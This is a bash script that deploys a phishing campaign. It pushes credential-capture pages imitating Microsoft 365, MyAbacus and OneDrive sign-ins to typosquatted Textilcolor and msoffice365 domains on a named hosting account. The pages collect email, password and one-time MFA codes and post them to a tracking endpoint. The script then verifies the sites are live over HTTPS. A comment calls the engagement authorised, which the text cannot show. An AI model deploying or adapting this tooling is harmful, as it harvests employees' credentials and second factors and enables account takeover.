#!/usr/bin/env bash
# Deploy the per-host, per-brand capture landings for the AUTHORISED Textilcolor
# awareness engagement to their Hostpoint docroots (deepaudit.ch engagement only).
#
# Each host gets a brand-appropriate variant; the capture flow (3-step
# email/password/OTP, login_hint prefill, mfa=0) is byte-identical across all of
# them — only the visual shell differs. For every host it renders the template
# (POST_URL -> live track.php, drops the unused tracker-beacon line) and pushes
# index.html + learn.html + assets to the docroot, then verifies HTTPS + cert.
# Idempotent; safe to re-run.
#
#   Usage:  bash deploy_campaign_landings.sh                       # all mapped hosts
#           bash deploy_campaign_landings.sh owa.texti1color.ch    # one host
#
# NOTE: remote.texti1color.ch (FortiGate VPN portal) is intentionally NOT in the
# map — it is operator/user-managed and must not be overwritten by this script.
set -euo pipefail

SSHK="${TAPHISH_SSH_KEY:-$HOME/.ssh/taphish_hostpoint_ed25519}"
HOST="azitufem@sl2084.web.hostpoint.ch"
SRC="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
POST_URL="https://deepaudit.ch/track.php"

# host  ->  library variant directory. A case map (not an associative array) so
# this runs on macOS's stock bash 3.2 as well as modern bash.
ALL_HOSTS="owa.texti1color.ch abacus.texti1color.ch sharepoint.texti1color.ch feed.msoffice365.ch"
variant_for() {
  case "$1" in
    owa.texti1color.ch)        echo "m365-login-capture"    ;; # K1 Outlook / M365 sign-in
    abacus.texti1color.ch)     echo "myabacus-login-capture" ;; # MyAbacus / AbaWeb pretext
    sharepoint.texti1color.ch) echo "onedrive-share-capture" ;; # K3 OneDrive / SharePoint share
    feed.msoffice365.ch)       echo "generic-login-capture"  ;; # generic easy-to-recognise tier
    *)                         echo ""                        ;;
  esac
}

# Targets: all mapped hosts, or just the ones named on the command line.
if [ "$#" -gt 0 ]; then TARGETS=("$@"); else TARGETS=($ALL_HOSTS); fi

deploy_one() {
  local d="$1" variant; variant="$(variant_for "$1")"
  if [ -z "$variant" ]; then echo "!! no variant mapped for $d — skipping"; return 0; fi
  local vdir="$SRC/$variant"
  if [ ! -f "$vdir/index.html" ]; then echo "!! variant '$variant' not found at $vdir — skipping"; return 0; fi
  echo "== deploying $variant -> $d"
  local TMP; TMP="$(mktemp -d)"; trap 'rm -rf "$TMP"' RETURN
  # Render: live POST_URL, and drop the {{TRACKER_URL_ATTR}} beacon line (the
  # landing reads rid/trackerId from the URL, so the beacon is unused here).
  sed -e "s#{{POST_URL}}#${POST_URL}#g" \
      -e '/data-tracker src="{{TRACKER_URL_ATTR}}"/d' \
      "$vdir/index.html" > "$TMP/index.html"
  cp "$vdir/learn.html" "$TMP/learn.html"
  mkdir -p "$TMP/assets"; cp -r "$vdir/assets/." "$TMP/assets/"
  ssh -i "$SSHK" -o StrictHostKeyChecking=accept-new "$HOST" "mkdir -p ~/www/$d/assets"
  scp -i "$SSHK" -q "$TMP/index.html" "$TMP/learn.html" "$HOST:~/www/$d/"
  scp -i "$SSHK" -q -r "$TMP/assets/"* "$HOST:~/www/$d/assets/"
}

for d in "${TARGETS[@]}"; do deploy_one "$d"; done

echo "== verifying"
for d in "${TARGETS[@]}"; do
  # `|| true` so the curl -w output (no trailing newline) doesn't trip `read`'s
  # non-zero EOF return under `set -e` and abort the verify summary.
  read -r code ssl < <(curl -sko /dev/null -w "%{http_code} %{ssl_verify_result}" "https://$d/" || echo "000 ?") || true
  echo "  $d  http=$code ssl_verify=$ssl  (ssl_verify=0 means cert OK)"
done
echo "Done."
